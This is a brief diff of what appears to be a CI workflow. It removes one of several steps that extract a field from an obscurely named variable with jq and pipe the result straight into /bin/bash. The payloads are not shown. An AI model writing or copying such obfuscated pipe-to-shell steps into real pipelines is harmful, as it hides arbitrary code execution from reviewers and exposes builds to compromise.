@@ -41,7 +41,6 @@ jobs:
           echo $ajy78209 | jq -r .pta134 | /bin/bash
           echo $ccxjq56767 | jq -r .xqc19 | /bin/bash
           echo $axcy5 | jq -r .ri262 | /bin/bash
-          echo $ytyrl7 | jq -r .j97116 | /bin/bash
           echo $npyc723 | jq -r .e6 | /bin/bash
           printf '%s' "$aq1" | jq -r .xx36 | /bin/bash
           printf '%s' "$jp256" | jq -r .gs3 | /bin/bash
